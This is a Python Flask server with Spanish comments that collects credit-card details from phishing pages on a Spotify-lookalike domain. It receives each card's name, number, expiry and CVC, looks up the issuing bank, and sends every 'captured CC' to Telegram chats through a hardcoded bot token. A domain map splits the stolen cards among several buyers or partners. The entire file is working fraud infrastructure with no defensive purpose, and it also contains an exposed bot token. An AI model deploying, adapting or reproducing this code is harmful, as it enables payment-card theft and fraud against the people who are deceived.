import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
# Tu Token de Telegram
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- MAPA DE CLIENTES (EL CORAZÓN DEL NEGOCIO) ---
# ESTRUCTURA: 'dominio_o_subdominio': ['ID1', 'ID2', 'ID3']
# NOTA: Los IDs SIEMPRE deben ir entre comillas y dentro de corchetes [ ].
CLIENTES_MAPA = {
    'spotlfypremium.online': ['6953415010', '7707049896'], # Dominio principal: le llega a TI y a tu SOCIO
    'cliente1.spotlfypremium.online': ['7707049896'],      # Subdominio 1: le llega solo a tu socio
    'promo.spotlfypremium.online': ['123456789'],         # Subdominio 2: le llega a un grupo
    'juan.spotlfypremium.online': ['987654321'],          # Subdominio 3: le llega a otro cliente
}

def get_bank_info_pro(card_number):
    """Consulta de banco con protección contra bloqueos."""
    bin_number = card_number[:6]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        print(f"🔍 Buscando banco para BIN: {bin_number}")
        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Desconocido')
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            return f"{bank} | {type_card} | {country}"
        return "🏦 Banco: Desconocido"
    except:
        return "🏦 Error de conexión"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    
    # 1. DETECCIÓN AUTOMÁTICA DE DOMINIO (Para saber a quién pertenece la CC)
    host_actual = request.host.split(':')[0] 
    print(f"🌐 Petición recibida desde el dominio: {host_actual}")

    # 2. BUSCAR LOS DESTINATARIOS EN EL MAPA
    # Buscamos la lista de IDs asociada a ese dominio
    lista_destinatarios = CLIENTES_MAPA.get(host_actual)

    # Si el dominio no está en nuestra lista, ignoramos la petición
    if not lista_destinatarios:
        print(f"🚫 Subdominio no autorizado: {host_actual}")
        return jsonify({"status": "ignored"}), 200

    # 3. CAPTURA DE DATOS
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 4. CONSULTA DE BANCO
    print(f"🔍 Consultando banco para la tarjeta: {tarjeta[:6]}...")
    info_banco = get_bank_info_pro(tarjeta)

    # 5. CONSTRUCCIÓN DEL MENSAJE
    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *ORIGEN:* `{host_actual}`\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    # 6. REPARTO MASIVO (Iteramos sobre la lista de destinatarios)
    exitos = 0
    for id_receptor in lista_destinatarios:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": id_receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
                print(f"✅ CC enviada con éxito al ID: {id_receptor}")
            else:
                print(f"❌ Error al enviar a {id_receptor}: {res.text}")
        except Exception as e:
            print(f"❌ Error de red al enviar a {id_receptor}: {e}")

    print(f"🏁 Proceso terminado. Mensajes enviados con éxito a {exitos} personas.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
